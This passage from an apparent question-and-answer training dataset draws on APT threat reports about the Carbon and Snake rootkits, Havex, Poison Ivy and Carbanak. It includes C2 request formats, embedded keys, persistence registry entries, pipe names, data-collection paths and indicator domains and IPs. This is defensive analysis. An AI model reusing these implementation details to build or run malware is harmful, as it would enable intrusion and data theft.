added peer-to-peer functionality, but otherwise didn't implement more elaborate functions. It used the same cryptographic algorithm as the recon tool, and also the same hardcoded key. As a rootkit, it had a component running in kernel mode, and 2 components running in user mode (one for C&C communication, and one for task execution). The kernel mode component tried to hide all activities from system monitoring, and in addition implemented an encrypted, virtual file store (VFS). The VFS was realized as 100 MB file (hidden by the rootkit) with an NTFS filesystem on it. CAST128 was also used for encryption of the VFS, but in a different encryption mode (CBC), with IVs derived from the block index, and a different hardcoded key. This VFS was used to store the user mode components, a configuration file, received (and not yet executed or forwarded) tasks, results not yet sent out, and logging information. Also a volatile virtual storage was implemented (like a RAM disk) for intermediate task results. The rootkit was very advanced for its time, and is a clear ancestor of the well known Snake rootkit. In 2009, we also found 64 bit implementations of the rootkit. There was no digital signature required at this time, not even on 64 bit systems; the later Snake rootkit used digitally signed, vulnerable VMware drivers as a carrier (vboxdrv.sys), as documented in several papers published in the past years.\nThe configuration file was a simple text file, in later versions it was additionally CAST-encrypted. Here is an (anonymized) example for such a configuration file:\n1 [NAME]\n2 object_id=1c2e30cd-abb3-41ef-a74d37 3\n4\n5\n[TIME]\n6\nuser_winmin = 700000\n7\nuser_winmax = 1200000\n8\nsys_winmin = 1800000\n9\nsys_winmax = 1900000\n10\ntask_min = 30000\n11\ntask_max = 40000\n12\ncheckmin = 60000\n13\ncheckmax = 70000\n14\nlogmin = 600000\n15\nlogmax = 1200000\n16\nlastconnect=1223023515\n17\ntimestop=\n18\nactive_con = 900000\n19\n20 [CW_LOCAL]\n21 quantity = 0\n22\n23 [CW_INET]\n24 quantity = 2\n25 address1 = 1.2.3.4:80\n26 address2 = 5.6.7.8:80\n27\n28 [TRANSPORT]\n29 user_pipe = \\\\.\\pipe\\userpipe\n30 system_pipe = \\\\.\\pipe\\iehelper 31 32\n33 [DHCP]\n34 server = 135\n35 36\n37 [LOG]\n38 lastsend =1223021515\n39 logperiod = 7200 40\n41 [WORKDATA]\n42 run_task=\n43 run_task_system=\n44 [VERSION]\n45 System=Carbon v1.53\n46 User=Carbon v1.42\nIn the CW_INET section, we see the C&C servers. Several can be configured, they are selected using the round robin method. Bots that do not contact C&C servers directly lack this section. CW_LOCAL is then used instead. TRANSPORT defines the internal named pipes for communication between the different threads on an infected bot.\nThe injection mechanism is more complex than the one of Tavdig, but follows the same basic principle. As a main difference, named pipes are used to communicate between the active threads. Typically, the thread injected into the web browser now is only responsible for C&C communication (and so can be called comm thread); received data, and data queued to be sent out, is stored in the VFS as dedicated files. The work\nthread, however, lives in a long-living process, like explore.exe, and executes tasks received by the comm thread. This means that receiving a task, executing a task, and sending out the results are decoupled, using a file system in between and named pipes for synchronization. This makes the setup far more reliable, tasks can't easily get lost anymore. Besides named pipes, mutexes are also required to avoid race conditions. This is also a disadvantage, it results in a more complex setup and easier detection due to pipe and mutex names.\nAnother drawback is the limited size of the VFS (100MB). Tasks -and mainly task results -can't be larger than this.\nIn 2012, we discovered a new Carbon variant. The main difference to the original Carbon from 2007 was it's lack of rootkit features and lack of VFS. It was only implemented as 2 usermode DLLs (implementing the same functionality as the original usermode DLLs), and a simple service binary started via the registry, but of course under administrative privileges. That's why we call it Carbon-DLL. The VFS was replaced by just using a random, already existing directory under the program directory tree, and encryption is realized by just CAST128-encrypting all single files in this working directory. The path of this working directory is stored in a random .inf file, using the hard disk serial number as fingerprint. So all the rootkit's hiding functions were replaced by obfuscation functions. Technically, this is more basic than using a rootkit, and it could be called a step backward -we assume the programmers were forced to do this due to Microsoft requiring kernel mode drivers to be digitally signed around this time. But it is also an advantage, because it makes the infection more stable, and in some way harder to detect, as there are no hidden files that suddenly become visible in safe mode. Also the problem with limited VFS size is solved, the only limit is the size of the root partition. Carbon DLL's most important evolution though was C&C cryptography: Like Tavdig, Carbon-DLL implements asymmetric encryption, but in this implementation based upon RSA. CAST128 encryption was still used under the hood, but that's probably only for historical reasons and does not add to the overall security. Carbon-DLL stored its keys in the configuration file. Note that RSA encryption only applies to infected bots, which directly communicate with C&C servers -and only these bots have configured keys; actually a separate section is added to the configuration file, in order to store keys for bots needing to communicate with C&C servers. However, this section doesn't exist upon installation; it can be added later on request, triggered by a specific task. Peer to peer communication behind these bots in the local network are only encrypted using CAST128, or not at all.\nFinally, the Snake rootkit must also be mentioned, though we never actually observed it in this case. It was used in other countries, and many publications exist about it. Uroburos is also sometimes used as another term for Snake, but sometimes Uroburos is also used for the whole family (which is, technically spoken, not correct). Snake is another stage 2 trojan, but we're not aware if it's used together with some recon tools. In terms of functionality, it contains features of both the Carbon rootkit and Carbon-DLL at the same time:\n\u2022 It is a rootkit, like the Carbon rootkit. This rootkit also works on 64 bit systems, requiring digitally signed drivers. To do this, it uses a exploitable, digitally signed driver from VMWare, as described in several publications. Hence it's an evolution of the Carbon rootkit. Like the afore mentioned, it contains an encrypted and hidden file store, but with increased size.\n\u2022 It lacks the asymmetric encryption used in Carbon-DLL, it's again based upon CAST128. So you can't call it an evolution of Carbon-DLL.\nThe best way to describe Snake is to call it a sibling of Carbon-DLL -as if the development of the Carbon rootkit split into 2 branches, one ending in Carbon-DLL, and one ending in Snake.\n\nWhat role does the configuration file play in the operation of the Carbon rootkit, and how is it structured?",
    "output": "The configuration file in the Carbon rootkit is a simple text file that can be CAST-encrypted in later versions. It includes sections such as [NAME], [TIME], [CW_LOCAL], [CW_INET], [TRANSPORT], [DHCP], [LOG], [WORKDATA], and [VERSION]. The file specifies various parameters like object ID, timing windows, C&C server addresses, named pipes for communication, and version information. This file allows for incremental updates and customization of the malware's behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Example request:\ndreamsblock.com (ekiaiokqmo.c08.mtsvc.net, 205.186.179.176) POST /witadmin/modules/source.php?id=28805135293025919409009AFDA8-25&v1=038&v2=17039 3861&q=5265882854508EFCF958F979E4\n\u2022 Read the HTML file returned by the server, look for havex markers and copy data from between them\n\u2022 Write the data to: %TEMP%\\<rand>.tmp.xmd\n\u2022 Decrypt/decompress content of xmd file to %TEMP%\\<rand>.dll\n\u2022 Load the DLL\nAt the moment of analysis, URLs from config were not returning any data:\nstalprof.com.ua/includes/domit/src.php (server39.hosting.reg.ru, 37.140.193.27)\n404\nzhayvoronok.com/wp-includes/pomo/idx.php (78.63.99.143)\n404\ndreamsblock.com/witadmin/modules/source.php\n<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'>\n</head><body>No data!<!--havexhavex--></body></head>0.\nEncryption\nThe 2nd stage modules are usually base64 encoded, bzip2 compressed and XORed using the recurrent \"1312312\" key.\nIn some cases, the malware can also use one 1024 bit RSA key which is embedded in the config section of the binary.\nKey from resource/config:\nBase64 encoded:\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb 5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB\nDecoded RSA 1024 bit key:\n0000000: 0004 d79f e322 c0bb bec4 2a0c 1bb4 aa63 .....\"....*....c\n0000010: 5b90 c409 35a8 b772 a040 fd2f 1215 42bd [...5..r.@./..B. 0000020: 99fe 0b2b 1c8b 204e f2bd 02eb 1d16 8fbd ...+.. N........ 0000030: 7f30 317f 5cd7 8f8d bcf3 4fa4 5269 2d99 .01.\\.....O.Ri-. 0000040: 56f9 1d26 22f1 3dbb 439e 1e43 864b 5052 V..&\".=.C..C.KPR 0000050: 8f29 9b2d 8077 303d 51c6 770a 6699 19a4 .).-.w0=Q.w.f... 0000060: d3d7 cbdc a19d f52a 91eb 432f ed0b 49e1 .......*..C/..I. 0000070: 5c06 0eaa f33a 36be 325e 1223 b7ba d02e \\....:6.2^.#.... 0000080: 2a0d\nKey hardcoded in binary:\nBase64 encoded:\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe v4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648=\nDecoded:\nAnalysis of other versions of the HAVEX loader\nIMPORTANT: For versions 03-0E, 010, 011, 015, 016, 023, 026-028, 02A-02F, and 031-036 no samples are known at the moment.\nDifferences between versions\nIt seems there are over 50 different versions of Havex malware, internally identified by hex numbers from 01 to 044 (the latest known at the time of writing).\nVersions 01 \u2013 019: Contain strings that may be related to password harvesting, even though the code that would actually search for the passwords was not identified inside this component. It's possible that these strings are part of the configuration and are used by downloaded modules as a list of names of processes that the malware wants to hijack in order to steal passwords from the memory.\nVersions 017 \u2013 037: Instead of the GET request, send a POST request to the C2. The contents of the POST differ between versions.\nVersions 01A \u2013 038: Check proxy settings in the registry and use them if required.\nVersions 01B \u2013 044: Use an asymmetric crypto algorithm (RSA) to decrypt the downloaded binaries. (Previous versions use simple XOR based encryption).\nVersions 020 \u2013 025: Check the Internet connection by trying to connect to google.com:\nCONNECT google.com:80 HTTP/1.0\nCollect system information, write it to *.yls file. Later, append these contents to the POST request string.\n\u2022 Collected information includes:\n\u2022 Unique system ID\n\u2022 OS\n\u2022 Username\n\u2022 Computer name\n\u2022 Country\n\u2022 Language\n\u2022 Current IP\n\u2022 List of drives\n\u2022 Default Browser\n\u2022 Running Processes\n\u2022 Proxy Setting\n\u2022 User Agent\n\u2022 Email Name\n\u2022 BIOS version and date\n\u2022 Lists of files and folders (non-recursive) from the following paths:\nC:\\Documents and Settings\\%User%\\Desktop\\*.*\nC:\\Documents and Settings\\%User%\\My Documents\\*.*\nC:\\Documents and Settings\\%User%\\My Documents\\Downloads\\*.*\nC: \\Documents and Settings\\%User%\\My Documents\\My Music\\*.*\nC: \\Documents and Settings\\%User%\\My Documents\\My Pictures\\*.*\nC:\\Program Files\\*.*\nRoot directory of all fixed and removable drives.\nVersion 025: Contains a debugging symbols path, which may suggest that the project was internally called \"PhalangX\":\nd:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb\nVersion 038 \u2013 040: Does not contain the routine that collects system info, yet the malware checks for potential previously created *.yls files, and appends the content of them to the POST request. Instead of values hardcoded in the binary, this is a first version to use a resource to store encrypted config. Detailed analysis of this version is included in this appendix.\nVersion 043 \u2013 044: Size similar to 037 and earlier versions; dll name is now 0XX.dll (where XX is version number), the <unk> value in config is now 29 bytes long.\nFeatures common across multiple versions\nEXPORTS:\nRunDllEntry, runDll (all versions)\nINJECT TO:\nExplorer.EXE (all versions)\nREG VALUES CREATED:\n[HKLM|HKCU]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\"TMP provider\" = \"rundll32 %TEMP%\\TMPprovider0XX.dll, runDll\"\n[HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\n\"fertger\" = <id>(all versions)\nFILES CREATED:\n<path>\\TMPprovider0XX.dll (versions <= 040)\n%TEMP%\\*.xmd (all versions)\n%TEMP%\\*.yls (ver 01A - 044)\n%TEMP%\\qln.dbx (ver 038 - 044)\nPIPES:\n\\\\.\\pipe\\mypype-f0XX (ver 01 - 025)\n\\\\.\\pipe\\mypype-g0X (ver 01 & 02)\n\\\\.\\pipe\\mypipe-f0XX (ver 029 - 038)\n\\\\.\\pipe\\mypipe-h0XX (ver 029 - 038)\nSTRINGS:\n(all versions)\nq=\n\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)\nAppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36\nSafari/525.19\"\n(ver 01 - 030)\nhavex\n1312312\n(ver 0F, 012, 014, 018)\nPhalanx-3d.Agent.dll\n(ver 01A - 038)\nUser\nPassword\nBUTTON\n(ver 01B - 030)\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb 5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB (ver 029 - 038)\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe v4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648= (ver 020 - 025)\n2003\nVista\nUserName\nComputerName\nControl Panel\\International\\\nsCountry\nCountry\nsLanguage\nLanguage\nControl Panel\\International\\Geo\\\nNation\nNot connected\nDial-up\nLAN Connection\nInetInfo\nCurrentIP\n- Removable\n- Fixed\n- Remote\n- CDROM\n- Ramdisk\nDrive\nhttp\\shell\\open\\command\n.exe\nDefaultBrowser\nListProcess\ndata64\nHARDWARE\\DESCRIPTION\\System\nBiosReg\nDesktop\nMyDocs\nProgFiles\nCONNECT google.com:80 HTTP/1.0\nProxy-Authorization:Basic\ngoogle.com\nGET / HTTP/1.1\nHost: google.com\n(ver 025)\nPhalanx-3d.ServerAgent.dll\n\"d:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb\"\n(ver 029 & 030)\n5265882854508EFCF958F979E4\n(ver 024, 029 - 038)\n&v1=\n&v2=\n(ver 037 & 038)\nMTMxMjMxMg==\n(ver 038 - 044)\n21f34\n(ver 043 - 044)\n04X.dll (instead of TmpPorvider0XX.dll)\nC2 communication\nDownloadable modules\nMain characteristics:\n\u2022 DLL files that collect assorted information\n\u2022 Downloaded by the main Havex module\n\u2022 Stored in %TEMP%\\*xmd files in an encrypted form\n\u2022 Decrypted and executed by Havex loader\n\u2022 Each module contains config stored as a resource\n\u2022 Config data is compressed with bzip2 and xored with a constant value 1312312, which is hardcoded in the binary in base64 form\n\u2022 Config data includes 29-byte UID, 344-byte encryption key and sometimes some other info (like nk2 file path in case of outlook module)\n\u2022 Most of them write harvested data into the %TEMP%\\*.yls files, which are then sent to the C2 by the main Havex DLL\n\u2022 Data written to *.yls files is compressed with bzip2 and encrypted with the key from the config\n\u2022 Encryption used for log encryption is 3DES. Each analyzed module contains the string: \"Copyright (c) J.S.A.Kapp 1994 - 1996.\" which is related to R_STDLIB.C file (platform-specific C library routines for RSAEURO crypto library)\nOPC modules\nDetailed analysis\nAll currently known samples are completely identical in terms of code and differ only in the content of the resource.\nCode flow:\n\u2022 Decrypt config\nConfig consists of RSA ID (29 bytes) and RSA key (1024 bit) and is stored inside resource TYU 0215 (bzip compressed and xored with \"1312312\")\n29 39ee448cf196304cfe9c6b1c2e436\n344 AATFfxXmUZl/j8JBAwHkk8BcwTIKDcex+0GQp/V9EX4nt64NGsGsTXFhuorwjKCRt6Av3v+hB+gT9mAP9kqY 3TnN1x+MUHaoib1dw8SG9mW5YL+JNu3Kwud/bYGu916U/EGh8PFGruVE2PHXD8EII710gKm00lyi5+Ehjn5C SLLPKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAQAB\n\u2022 Create lock file in %TEMP%\\{rand}.tmp (empty)\n\u2022 Create debug log in %TEMP%\\{rand}.tmp.dat\nProgramm was started at %02i:%02i:%02i\n%02i:%02i:%02i.%04i:\n**************************************************************************\nStart finging of LAN hosts...\nFinding was fault. Unexpective error\nWas found %i hosts in LAN:\nHosts was't found.\nStart finging of OPC Servers...\nWas found %i OPC Servers.\n%i) [<comp_name>\\<ProgID>]\nOPC version support: <[+|-][+|-][+|-]>\nOPC Servers not found. Programm finished\nThread %02i return error code: <error_code>\nStart finging of OPC Tags...\n%i)[%s\\%s]\nSaved in 'OPCServer%02i.txt'\n%i)[%s] (not aviable)\nThread %02i was terminated by ThreadManager(2)\nThread %02i running...\nThread %02i finished.\n\u2022 Look for LAN resources using Windows Networking COM objects:\nWNetOpenEnumW\nWNetEnumResource\n\u2022 For each resource found, create a thread which checks if it's an OPC server & gets detailed OPC information using the following interfaces:\nand writes collected info to the OPCServer<nr>.txt file:\n%s  <%s> (Type=%i, Access=%i, ID='%s')\nOPC Server[%s\\%s] v%i.%i(b%i)\n\nWhat are the primary characteristics of the downloadable modules used by the HAVEX malware, and how do they communicate with the C2 server?",
    "output": "The downloadable modules used by the HAVEX malware are DLL files that collect various types of information. They are downloaded by the main Havex module, stored in %TEMP%\\*xmd files in an encrypted form, and then decrypted and executed by the Havex loader. Each module contains a config stored as a resource, which is compressed with bzip2 and XORed with a constant value '1312312'. The config data includes a 29-byte UID, a 344-byte encryption key, and sometimes additional information. Most modules write harvested data into %TEMP%\\*.yls files, which are then sent to the C2 server by the main Havex DLL. The data written to *.yls files is compressed with bzip2 and encrypted with a 3DES key from the config.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Clustering\nTo cluster the activity of specific APT campaigns across our PIVY sample set, we first grouped the PIVY samples by common CnC infrastructure. Using passive DNS, we clustered the domain names used by the common IP address to which\nthey resolved. Because attackers may park their domains by pointing to IP addresses that they do not necessarily control (and to account for other possible anomalies in passive DNS data), we layered additional indicators extracted from the samples, such as PIVY passwords, mutexes, campaign \"marks/codes,\"26 and launcher information.27 From our data set, we focused on three separate APT campaigns and corresponding threat actors identified by the PIVY password used in subsequent attacks:\n\u2022 admin@338\n\u2022 th3bug\n\u2022 menuPass\nEach of these campaigns is detailed in the corresponding sections.\nTable 3: Common PIVY passwords seen in PIVY variants attributed to APT attacks\n25 A mutex is a Windows object used for inter-process synchronization. They are often used by malware to ensure only one instance of the malware is running     on an infected system at a given time.\n26 A campaign mark/code is typically a string designated by a threat actor that is often included as part of the malware communication and/or embedded within the malware binaries. It is used to identify targeted attack campaigns against a set number of targets (usually by industry), so the threat actor can keep attacks organized.\n27 Launchers are malware built specifically to load other malware (payload), often by decrypting the payload and injecting it into a host process on the target's endpoint.\nTo triangulate the timing (when the sample was likely used), we used the portable executable (PE) compile time extracted from the PIVY samples and the date each sample appeared first appeared in a malwareanalysis services such as VirusTotal. Each of these APT campaigns has been active from 2008 through 2013.\nMedium Headline: Campaign 1: admin@338\nOur data set for the admin@338 threat actor contains the following:\n\u2022 21 Poison Ivy samples\n\u2022 3 passwords\n\u2022 43 CnC servers\nThe earliest admin@338 PIVY sample we have dates to December 27, 2009. But we believe that this campaign was active as early as January 7, 2008, using other PIVY passwords (key@123 and gwx@123). This ongoing campaign tends to target the finance, economic, and trade policy but we see significant activity in the ISP/telco, government, and defense sectors as well.\nFigure 9: Percent of admin@338 APT group attacks by industry\nSmall Headline: Attack vector\nThe preferred attack vector used by this campaign is spear-phishing emails. Using content that is relevant to the target, these emails are designed to entice the target to open an attachment that contains the malicious PIVY server code.\nThe content of the spear-phishing emails and the decoy documents opened after exploitation tend to be in English\u2014although the character set of the email message body in Figure 10 is actually Chinese (character set GB2312).28\nFigure 10: Example spear-phishing email launched by the admin@338 APT group\n28 Wikipedia. \"GB 2312.\" February 2013.\nSmall Headline: Clustering\nIn addition to the PIVY password admin@338, we clustered individual attacks by using passive DNS data to look at the IP addresses the CnC servers have resolved to over time. We found that common IP addresses among PIVY samples for admin@338, key@123 and gwx@123.\nFigure 11: GB2312 encoding in spear-phishing email launched by the admin@338 APT group\n29 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2012-0158.\" April 2012.\n30 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2009-4324.\" December 2009.\nWe can link PIVY passwords key@123 with admin@338 by observing the following connections:\n\u2022 The key@123 sample, 808e21d6efa2884811fbd0adf67fda78, connects directly to 219.76.208.163.\n\u2022 Two CnC domain names from the admin@338 sample 8010cae3e8431bb11ed6dc9acabb93b7, www.webserver.dynssl.com and www. webserver.freetcp.com, resolved to that same IP address (219.76.208.163).\nWe can link PIVY passwords gwx@123 with admin@338 by observing the following connections:\n\u2022 The gwx@123 sample 0323de551aa10ca6221368c4a73732e6 connects to the CnC domain names microsofta. byinter.net, microsoftb.byinter.net, microsoftc. byinter. net, and microsofte.byinter.net. These domain names resolved to 113.10.246.30 219.90.112.203, 202.65.220.64, 75.126.95.138, 219.90.112.197, 202.65.222.45, and 98.126.148.114.\n\u2022 The admin@338 sample 8010cae3e8431bb11ed6dc9acabb93b7 connects to the CnC domains www. webserver.fartit.com, www.webserver. freetcp.com, and www.webserver.dynssl.com.\n\u2022 www.webserver.fartit.com resolved to 113.10.246.30, 219.90.112.203, 202.65.220.64, and 75.126.95.138, which overlap with the gwx@123 IP addresses.\n\u2022 www.webserver.freetcp.com resolved to 113.10.246.30, 219.90.112.203, 202.65.220.64, 75.126.95.138, 219.90.112.197, and 202.65.222.45, which overlap with the gwx@123 IP addresses.\n\u2022 www.webserver.dynssl.com resolved to 113.10.246.30, 219.90.112.203, 219.90.112.203, 75.126.95.138, 219.90.112.197, and 202.65.222.45, which overlap with the gwx@123 IP addresses.\nThis data indicates a relationship among the threat actors behind these attacks\u2014in most cases, they at least share a common CnC infrastructure.\nIn addition to historic DNS resolutions, PIVY process mutexes suggest a relationship between PIVY passwords gwx@123 and admin@338.\nAlthough the mutexes of gwx@123, wwwst@ Admin, and admin@338 samples were different, the choice of characters in the mutex revealed a similar pattern.\nSmall Headline: Attack vector\nUnlike the other two campaigns described in this report (admin@338 and menuPass), th3bug does not appear to rely on spear phishing to distribute PIVY. Instead, attacks attributed to th3bug use a strategic Web compromise to infect targets. This approach is more indiscriminate, which probably accounts for the more disparate range of targets.\nIn the FireEye blog, we documented a recent th3bug strategic Web compromise.31\nIn the following example, the actor or actors behind the th3bug campaign compromised multiple websites that catered to the intended targets. The attacker used injected JavaScript on the compromised websites to redirect targets to an Internet Explorer exploit that dropped Stage 1 launcher/downloader mobile code. This downloader then retrieved and installed a PIVY RAT variant.\n31 Thoufique Haq and Yasir Khalid. \"Internet Explorer 8 Exploit Found in Watering Hole Campaign Targeting Chinese Dissidents.\" March 2013.\nSmall Headline: Weaponization\nIn related campaigns, th3bug has used a number of different Java and Internet Explorer exploits, including (CVE-2013-0422),32 (CVE-2013-1347),33 and (CVE-2011-3544).34\nFigure 17: Example of ROP exploit code used by th3bug APT group\nFigure 18: Cluster intel of the th3bug APT group\n32 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2013-0422.\" February 2013.\n33 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2013-0422.\" January 2013.\n34 National Institute of Standards and Technology. \"Vulnerability Summary for CVE-2011-3544.\" October 2011.\nThe default PIVY password of admin has been used by multiple, distinct threat actors\u2014so clearly, we cannot link all PIVY samples with the admin password to th3bug. But evidence suggests that the attackers originally used the default password before settling on th3bug. We can link at least one PIVY sample that uses the admin password to the th3bug campaign based on the following connections:\n\u2022 The sample 8002debc47e04d534b45f7bb7dfcab4d connected to kr.iphone.qpoe.com with the PIVY password admin.\n\u2022 The domain kr.iphone.qpoe.com resolved to 180.210.206.96 on January 12, 2012.\n\u2022 The domain nkr.iphone.qpoe.com also resolved to 180.210.206.96 on January 3, 2012.\n\u2022 The domain nkr.iphone.qpoe.com also resolved to 101.78.151.179 on December 23, 2011.\n\u2022 The domain e.ct.toh.info resolved to 101.78.151.179 on June 12, 2012.\n\u2022 The sample 55a3b2656ceac2ba6257b6e39f4a5b5a connected to ct.toh.info domain with the PIVY password th3bug.\nWe found a smaller number of distinct PIVY samples linked to th3bug than we did for the admin@338 and menuPass campaigns. This paucity is likely a result of two factors.\nFirst, th3bug does not appear to stage a high volume of attacks. Instead, it appears to run only a handful of strategic Web compromise attacks each year. Second, th3bug stages its delivery of PIVY.\nSo to acquire the second-stage PIVY server payload, an attack must be observed in real time.\nFigure 19: Partial cluster intel of the th3bug APT group (zoomed in)\nMedium Headline: Campaign 3: menuPass\nOur data set for the menuPass threat actor comprises the following:\n\u2022 118 Poison Ivy samples\n\u2022 8 passwords\n\u2022 61 domains\n\u2022 74 IP addresses\nThe earliest menuPass PIVY sample we have is dated December 14, 2009. This sample (b08694e14a9b966d8033b42b58ab727d) connected to a control server at js001.3322.org with a password xiaoxiaohuli (Chinese translation: \"little little fox\"). Based on what we have found, it appears that the threat actor behind menuPass prefers to target U.S. and foreign defense contractors.\nFigure 20: Percent of menuPass APT group attacks by industry\nQ: What methods were used to triangulate the timing of when a PIVY sample was likely used in an attack? Why were these methods effective?",
    "output": "To triangulate the timing of when a PIVY sample was likely used, the researchers used the portable executable (PE) compile time extracted from the PIVY samples and the date each sample first appeared in malware analysis services such as VirusTotal. These methods were effective because they provided a historical record of when the malware was compiled and when it was first detected, helping to establish a timeline for the attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Analysis\nDuring the spring of 2014, Kaspersky Lab was involved in a forensic analysis of ATMs dispensing cash to people located near them but with no physical interaction according to security cameras. No malware was detected on these ATMs. However, Carberp-like malware was found on a computer that was connected to them via VPN.\nFollowing the investigation of this incident, in the summer of 2014, Kaspersky Lab identified the same Carberp-like malware in another investigation involving a bank, where criminals were able to gain access to its online banking systems. In this investigation, we started analyzing all the computers in the bank's infrastructure in order to find the source of the infection. We found spear phishing emails with CPL files attached that, after a successful infection, install the same Carberp-like malware we had previously found in the case involving the ATMs.\nThere is evidence indicating that in most cases the network was compromised for between two to four months, and that many hundreds of computers within a single victim organization may have been infected. This period of time was used by the attackers to get access to the right victims and critical systems, and to learn how to operate their tools and systems to get the cash out.\nCarbanak contains an espionage component that allows the attackers to take control of video capabilities on the victim systems. Thanks to this, long term observation and reconnaissance could be conducted. This allowed the attackers to understand the protocols and daily operational tempo of their targets. Based on this understanding, exploitation methodologies and mechanisms were developed and tailored to each victim.\nMedium Headline: 2.1 Infection and Transmission\nAll observed cases used spear phishing emails with Microsoft Word 97 \u2013 2003 (.doc) files attached or CPL files. The doc files exploit both Microsoft Office (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761).\nThere are indicators that point to a possible Chinese origin for the exploits used in these attachments. Command and Control (C2) servers located in China have been identified in this campaign. In addition, registration information for some of the domains use details of supposedly Chinese citizens. Obviously, all this could just be a red herring.\nThe targets were all employees affiliated to the affected institution. The spear phishing email messages appeared legitimate and in some cases were sent from compromised coworkers\u00b4 accounts. In this way compromised systems were used as a transmission vector.\nGiven that the victims were mostly Russian-speaking financial institutions, the names of the attachments we have identified were generally in Russian. Examples include \"\u0421\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u0424\u0417-115\" and \"\u041f\u0440\u0438\u0433\u043b\u0430\u0448\u0435\u043d\u0438\u0435\" which translate into \"Accordance to Federal Law\" and \"Invitation\" respectively. This is enough to induce a typical employee to open the attachment and execute the malware. For a complete list of file names see Appendix 4.\nThe following is an example of a Carbanak spear phishing email:\nTranslated:\nIn this case, the attachment was a CPL file compressed using the Roshal Archive (.rar) format.\nOnce the remote code execution vulnerability is successfully exploited, it installs Carbanak on the victim's system. The complete list of observed spear phishing emails can be found in Appendix 1 \u2013 Spear phishing.\nAn additional infection vector that we believe was used by the criminals is a classical drive-by-download attack. We have found traces of the Null and the RedKit exploits kits.\nThe image above translates as Country_name, All visitors, Unique visitors, Banned visitor, Revoked infections, Infected.\nMedium Headline: 2.2 Malware Analysis \u2013 Backdoor.Win32.Carbanak\nCarbanak is a backdoor used by the attackers to compromise the victim's machine once the exploit, either in the spear phishing email or exploit kit, successfully executes its payload. This section provides a functional analysis of Carbanak's capabilities.\nCarbanak copies itself into \"%system32%\\com\" with the name \"svchost.exe\" with the file attributes: system, hidden and read-only. The original file created by the exploit payload is then deleted.\nTo ensure that Carbanak has autorun privileges the malware creates a new service. The naming syntax is \"<ServiceName>Sys\" where ServiceName is any existing service randomly chosen, with the first character deleted. For example, if the existing service\u00b4s name is \"aspnet\" and the visible name is \"Asp.net state\nservice\", the service created by the malware would be \"aspnetSys\" with a visible name of \"Sp.net state service\".\nBefore creating the malicious service, Carbanak determines if either the avp.exe or avpui.exe processes (components of Kaspersky Internet Security) is running. If found on the target system, Carbanak will try to exploit a known vulnerability in Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local privilege escalation. We believe this is not relevant and that the attackers adapt their tools to the victim\u00b4s defenses.\nCarbanak creates a file with a random name and a .bin extension in %COMMON_APPDATA%\\Mozilla where it stores commands to be executed.\nThen the malware gets the proxy configuration from the registry entry:\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings] and the Mozilla Firefox configuration file in:\n%AppData%\\Mozilla\\Firefox\\<ProfileName>\\prefs.js\nHow to detect Carbanak\nOne of the best methods for detecting Carbanak is to look for .bin files in the folder:\n..\\All users\\%AppData%\\Mozilla\\\nThe malware saves files in this location that will later be sent to the 